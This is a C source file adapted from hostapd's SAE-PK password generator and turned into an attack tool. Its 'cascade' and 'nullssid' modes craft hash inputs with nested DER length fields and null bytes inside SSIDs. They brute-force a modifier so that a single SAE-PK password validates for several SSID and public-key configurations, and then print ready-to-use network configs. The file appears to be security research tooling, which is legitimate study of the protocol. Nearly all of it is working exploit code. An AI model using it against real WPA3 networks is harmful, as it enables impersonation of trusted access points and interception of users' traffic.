/*
 * SAE-PK password/modifier generator
 * Copyright (c) 2020, The Linux Foundation
 *
 * This software may be distributed under the terms of the BSD license.
 * See README for more details.
 */

#include "utils/includes.h"

#include "utils/common.h"
#include "utils/base64.h"
#include "crypto/crypto.h"
#include "common/sae.h"

void hex_dump(const void *arg, size_t len, const char *prefix)
{
	u8* buff = (u8*)arg;
	if (prefix)
		printf("%s", prefix);

	for (size_t i = 0; i < len; i++)
		printf("%02X ", buff[i]);
	printf("\n");
}


int read_private_key(const char *filename, char **der, size_t *der_len,
		     struct crypto_ec_key **key, struct wpabuf **pub,
		     size_t *hash_len)
{
	int group;

	*der = os_readfile(filename, der_len);
	if (!*der) {
		fprintf(stderr, "Could not read %s: %s\n",
			filename, strerror(errno));
		return -1;
	}

	*key = crypto_ec_key_parse_priv((u8 *) *der, *der_len);
	if (!*key) {
		fprintf(stderr, "Could not parse ECPrivateKey\n");
		return -1;
	}

	*pub = crypto_ec_key_get_subject_public_key(*key);
	if (!*pub) {
		fprintf(stderr, "Failed to build SubjectPublicKey\n");
		return -1;
	}

	group = crypto_ec_key_group(*key);
	switch (group) {
	case 19:
		*hash_len = 32;
		break;
	case 20:
		*hash_len = 48;
		break;
	case 21:
		*hash_len = 64;
		break;
	default:
		fprintf(stderr, "Unsupported private key group\n");
		return -1;
	}

	return 0;
}


char * data_to_base64(const u8 *data, size_t data_len)
{
	char *src, *pos, *b64;

	b64 = base64_encode(data, data_len, NULL);
	if (!b64)
		return NULL;
	src = pos = b64;
	while (*src) {
		if (*src != '\n')
			*pos++ = *src;
		src++;
	}
	*pos = '\0';

	return b64;
}


void print_config(u8 *data, size_t data_len, char *password, size_t ssid_len, char *der, size_t der_len, int hexssid)
{
	char m_hex[2 * SAE_PK_M_LEN + 1];
	char *privkey = NULL, *pubkey = NULL;
	size_t pubkey_len;

	// 1. Print the SSID in hex encoding
	if (hexssid) {
		printf("ssid2=");
		for (int i = 0; i < ssid_len; ++i)
			printf("%02X", data[i]);
		printf("\n");
	} else {
		printf("ssid2=\"%.*s\"\n", (int)ssid_len, data);
	}

	// 2. Print the (fake) modifier in hex
	if (wpa_snprintf_hex(m_hex, sizeof(m_hex), data + ssid_len, SAE_PK_M_LEN) < 0)
		return;

	// 3. Encode the *private* key to base64
	privkey = data_to_base64((u8*)der, der_len);

	// 4. Encode the *advertised* public key to hex
	pubkey_len = data_len - ssid_len - SAE_PK_M_LEN;
	pubkey = data_to_base64(data + ssid_len + SAE_PK_M_LEN, pubkey_len);

	// 5. Print the resulting config
	printf("# SAE-PK password/M/private key/public key.\n");
	printf("sae_password=%s|pk=%s:%s:%s\n", password, m_hex, privkey, pubkey);

	os_free(privkey);
	os_free(pubkey);
}


int attack_cascade(int argc, char *argv[])
{
	char *der = NULL;
	size_t der_len;
	struct crypto_ec_key *key = NULL;
	struct wpabuf *pub = NULL;
	u8 *data = NULL, *dst, *modifier;
	size_t data_len, pos;
	char *pw = NULL;
	int sec, j;
	int ret = -1;
	u8 hash[SAE_MAX_HASH_LEN];
	u8 pw_base_bin[SAE_MAX_HASH_LEN];
	size_t hash_len;
	unsigned long long i, expected;
	u32 sec_1b, val20;
	char *ssid;
	size_t min_ssid_len, max_ssid_len;
	u8 *pubdata;
	int length_bytes;

	if (argc != 5) {
		fprintf(stderr,
			"usage: sae_pk_gen cascade <DER ECPrivateKey file> <Sec:3|5> <SSID>\n");
		goto fail;
	}

	ssid = argv[4];
	if (strlen(ssid) < 16) {
		fprintf(stderr,
			"Give an SSID of at least 17 characters\n");
		goto fail;
	}

	sec = atoi(argv[3]);
	if (sec != 3 && sec != 5) {
		fprintf(stderr,
			"Invalid Sec value (allowed values: 3 and 5)\n");
		goto fail;
	}
	sec_1b = sec == 3;
	expected = 1;
	for (j = 0; j < sec; j++)
		expected *= 256;

	if (read_private_key(argv[2], &der, &der_len, &key, &pub, &hash_len) < 0)
		goto fail;
	pubdata = (u8*)wpabuf_head(pub);
	if (pubdata[0] != 0x30 || (pubdata[1] & 0x80) != 0 ||
	    pubdata[2] != 0x30 || pubdata[3] != 0x13) {
		fprintf(stderr,
			"Public key has unexpected starting header, can't construct cascade\n");
		goto fail;
	}

	// Hash input structure:
	//
	//	          ssid          || fake modifier || pubkey [30 88 00 00 00 00 00 00 00 39 ...] || modifier
	//	...
	//	ssid_N || fake modifier ||            pubkey'                                          || modifier
	//
	// Original pubkey start: [30 39 ...] => our construction adds 8 bytes
	//
	data_len = os_strlen(ssid) + SAE_PK_M_LEN + wpabuf_len(pub) + 8 + SAE_PK_M_LEN;
	max_ssid_len = os_strlen(ssid);
	min_ssid_len = os_strlen(ssid) - SAE_PK_M_LEN;
	// Now allocate memory and construct the above data
	data = os_malloc(data_len);
	if (!data) {
		fprintf(stderr, "No memory for data buffer\n");
		goto fail;
	}
	os_memcpy(data, ssid, os_strlen(ssid));
	pos = os_strlen(ssid);

	// Generate the cascading structure. This is easiest from back to front.
	// At the back we start with 10 length bytes. Two to skip the 30 88 header of the
	// public key, and another 8 for the length (which overflows the header away).
	length_bytes = 10;
	for (int step = SAE_PK_M_LEN - 2; step >= 0; step -= 2) {
		data[pos + step]      = 0x30;
		data[pos + step + 1]  = 0x80 + length_bytes;
		// In the next cascade, we will also have to jump over the two bytes
		// that we added in this loop. So hence the +2.
		length_bytes += 2;
	}
	pos += SAE_PK_M_LEN;

	// Now construct the overflow length field
	data[pos++] = 0x30;
	data[pos++] = 0x88;
	memset(data + pos, 0, 7);
	pos += 7;
	data[pos++] = pubdata[1];

	// Put the remainder of the public key
	memcpy(data + pos, pubdata + 2, wpabuf_len(pub) - 2);
	pos += wpabuf_len(pub) - 2;

	// Finally we have the *real* modifier
	modifier = data + pos;
	if (os_get_random(modifier, SAE_PK_M_LEN) < 0) {
		fprintf(stderr, "Could not generate random Modifier M\n");
		goto fail;
	}
	pos += SAE_PK_M_LEN;

	hex_dump(data, data_len, NULL);

	fprintf(stderr, "Searching for a suitable Modifier M value\n");
	for (i = 0;; i++) {
		if (sae_hash(hash_len, data, data_len, hash) < 0) {
			fprintf(stderr, "Hash failed\n");
			goto fail;
		}
		if (hash[0] == 0 && hash[1] == 0) {
			if ((hash[2] & 0xf0) == 0)
				fprintf(stderr, "\r%3.2f%%",
					100.0 * (double) i / (double) expected);
			for (j = 2; j < sec; j++) {
				if (hash[j])
					break;
			}
			if (j == sec)
				break;
		}
		inc_byte_array(modifier, SAE_PK_M_LEN);
	}

	printf("\n");

	/**
	 * Derive the SAE-PK password.
	 *
	 * Skip 8*Sec bits and add Sec_1b as the every 20th bit starting with one.
	 */
	os_memset(pw_base_bin, 0, sizeof(pw_base_bin));
	dst = pw_base_bin;
	for (j = 0; j < 8 * (int) hash_len / 20; j++) {
		val20 = sae_pk_get_be19(hash + sec);
		val20 |= sec_1b << 19;
		sae_pk_buf_shift_left_19(hash + sec, hash_len - sec);

		if (j & 1) {
			*dst |= (val20 >> 16) & 0x0f;
			dst++;
			*dst++ = (val20 >> 8) & 0xff;
			*dst++ = val20 & 0xff;
		} else {
			*dst++ = (val20 >> 12) & 0xff;
			*dst++ = (val20 >> 4) & 0xff;
			*dst = (val20 << 4) & 0xf0;
		}
	}

	pw = sae_pk_base32_encode(pw_base_bin, 20 * 3 - 5);
	if (!pw)
		goto fail;

	for (int ssid_len = min_ssid_len; ssid_len <= max_ssid_len; ssid_len += 2) {
		printf("\n\t[ Network config - %d ]\n\n", ssid_len);
		print_config(data, data_len, pw, ssid_len, der, der_len, 0);
	}

	printf("\n\n");
	printf("# All the following longer passwords are also a valid password collision:\n");
	for (j = 4; j <= ((int) hash_len * 8 + 5 - 8 * sec) / 19; j++) {
		os_free(pw);
		pw = sae_pk_base32_encode(pw_base_bin, 20 * j - 5);
		if (pw)
			printf("# %s\n", pw);
	}

	ret = 0;
fail:
	os_free(der);
	wpabuf_free(pub);
	crypto_ec_key_deinit(key);

	os_free(data);
	os_free(pw);

	os_program_deinit();

	return ret;
}


int attack_nullssid(int argc, char *argv[])
{
	char *der1 = NULL, *der2 = NULL;
	size_t der1_len, der2_len;
	struct crypto_ec_key *key1 = NULL, *key2 = NULL;
	struct wpabuf *pub1 = NULL, *pub2 = NULL;
	u8 *data = NULL, *dst, *modifier;
	size_t data_len, pos;
	char *pw = NULL;
	int sec, j;
	int ret = -1;
	u8 hash[SAE_MAX_HASH_LEN];
	u8 pw_base_bin[SAE_MAX_HASH_LEN];
	size_t hash1_len, hash2_len;
	unsigned long long i, expected;
	u32 sec_1b, val20;
	char *ssid1, *ssid2;
	size_t zero_bytes, ssid1_len, ssid2_len;

	if (argc != 7) {
		fprintf(stderr,
			"usage: sae_pk_gen nullssid <DER ECPrivateKey file 1> <DER ECPrivateKey file 2> <Sec:3|5> <SSID 1> <SSID 2>\n");
		goto fail;
	}

	ssid1 = argv[5];
	ssid2 = argv[6];
	if (os_strlen(ssid1) >= os_strlen(ssid2)) {
		fprintf(stderr,
			"SSID 1 must be shorter than SSID 2\n");
		goto fail;
	} else if (os_strlen(ssid2) - os_strlen(ssid1) >= SAE_PK_M_LEN) {
		fprintf(stderr,
			"SSID 2 can be at most %d characters longer than SSID 1\n", SAE_PK_M_LEN - 1);
		goto fail;
	} else if (memcmp(ssid1, ssid2, strlen(ssid1)) != 0) {
		fprintf(stderr,
			"SSID 1 must be a prefix of SSID 2\n");
		goto fail;
	}

	sec = atoi(argv[4]);
	if (sec != 3 && sec != 5) {
		fprintf(stderr,
			"Invalid Sec value (allowed values: 3 and 5)\n");
		goto fail;
	}
	sec_1b = sec == 3;
	expected = 1;
	for (j = 0; j < sec; j++)
		expected *= 256;

	if (read_private_key(argv[2], &der1, &der1_len, &key1, &pub1, &hash1_len) < 0)
		goto fail;
	if (read_private_key(argv[3], &der2, &der2_len, &key2, &pub2, &hash2_len) < 0)
		goto fail;

	if (hash1_len != hash2_len) {
		fprintf(stderr,
			"Both private/public keys must be of the same group (their primes must have the same length)\n");
		goto fail;
	}

	// Allocate data for the hash input. This has the following format:
	//	ssid1 ||      fake modifier     || pubkey1                   || trailing data || modifier
	//	ssid2           || zero byte(s) || trailing ssid bytes       || pubkey2       || modifier
	zero_bytes = SAE_PK_M_LEN - (os_strlen(ssid2) - os_strlen(ssid1));
	data_len = os_strlen(ssid2) + zero_bytes + wpabuf_len(pub1) + wpabuf_len(pub2) + SAE_PK_M_LEN;
	// Remember the advertised SSID lengths
	ssid1_len = os_strlen(ssid1);
	ssid2_len = os_strlen(ssid2) + zero_bytes + wpabuf_len(pub1) - SAE_PK_M_LEN;
	// Now allocate memory and construct the above data
	data = os_malloc(data_len);
	if (!data) {
		fprintf(stderr, "No memory for data buffer\n");
		goto fail;
	}
	os_memcpy(data, ssid2, os_strlen(ssid2));
	pos = os_strlen(ssid2);

	// Null terminator(s) inside SSID2 == part of fake modifier for SSID1
	memset(data + pos, 0, zero_bytes);
	pos += zero_bytes;

	// Now both public keys follow
	os_memcpy(data + pos, wpabuf_head(pub1), wpabuf_len(pub1));
	pos += wpabuf_len(pub1);
	os_memcpy(data + pos, wpabuf_head(pub2), wpabuf_len(pub2));
	pos += wpabuf_len(pub2);

	// Finally we have the *real* modifier
	modifier = data + pos;
	if (os_get_random(modifier, SAE_PK_M_LEN) < 0) {
		fprintf(stderr, "Could not generate random Modifier M\n");
		goto fail;
	}

	fprintf(stderr, "Searching for a suitable Modifier M value\n");
	for (i = 0;; i++) {
		if (sae_hash(hash1_len, data, data_len, hash) < 0) {
			fprintf(stderr, "Hash failed\n");
			goto fail;
		}
		if (hash[0] == 0 && hash[1] == 0) {
			if ((hash[2] & 0xf0) == 0)
				fprintf(stderr, "\r%3.2f%%",
					100.0 * (double) i / (double) expected);
			for (j = 2; j < sec; j++) {
				if (hash[j])
					break;
			}
			if (j == sec)
				break;
		}
		inc_byte_array(modifier, SAE_PK_M_LEN);
	}

	printf("\n");

	/**
	 * Derive the SAE-PK password.
	 *
	 * Skip 8*Sec bits and add Sec_1b as the every 20th bit starting with one.
	 */
	os_memset(pw_base_bin, 0, sizeof(pw_base_bin));
	dst = pw_base_bin;
	for (j = 0; j < 8 * (int) hash1_len / 20; j++) {
		val20 = sae_pk_get_be19(hash + sec);
		val20 |= sec_1b << 19;
		sae_pk_buf_shift_left_19(hash + sec, hash1_len - sec);

		if (j & 1) {
			*dst |= (val20 >> 16) & 0x0f;
			dst++;
			*dst++ = (val20 >> 8) & 0xff;
			*dst++ = val20 & 0xff;
		} else {
			*dst++ = (val20 >> 12) & 0xff;
			*dst++ = (val20 >> 4) & 0xff;
			*dst = (val20 << 4) & 0xf0;
		}
	}

	pw = sae_pk_base32_encode(pw_base_bin, 20 * 3 - 5);
	if (!pw)
		goto fail;

	printf("\n\t[ Network config 1]\n\n");
	print_config(data, data_len, pw, ssid1_len, der1, der1_len, 1);
	printf("\n\n\t[ Network config 1]\n\n");
	print_config(data, data_len, pw, ssid2_len, der2, der2_len, 1);

	printf("\n\n");
	printf("# All the following longer passwords are also a valid password collision:\n");
	for (j = 4; j <= ((int) hash1_len * 8 + 5 - 8 * sec) / 19; j++) { // XXX
		os_free(pw);
		pw = sae_pk_base32_encode(pw_base_bin, 20 * j - 5);
		if (pw)
			printf("# %s\n", pw);
	}

	ret = 0;
fail:
	os_free(der1);
	wpabuf_free(pub1);
	crypto_ec_key_deinit(key1);
	os_free(der2);
	wpabuf_free(pub2);
	crypto_ec_key_deinit(key2);

	os_free(data);
	os_free(pw);

	os_program_deinit();

	return ret;
}


int main(int argc, char *argv[])
{
	wpa_debug_level = MSG_INFO;
	if (os_program_init() < 0)
		return -1;

	if (argc < 2) {
		fprintf(stderr,
			"usage: sae_pk_gen <nullssid|cascade>\n");
		return -1;
	}

	if (strcmp(argv[1], "nullssid") == 0)
		return attack_nullssid(argc, argv);
	else if (strcmp(argv[1], "cascade") == 0)
		return attack_cascade(argc, argv);
	else {
		fprintf(stderr, "Unknown attack option\n");
		return -1;
	}
}

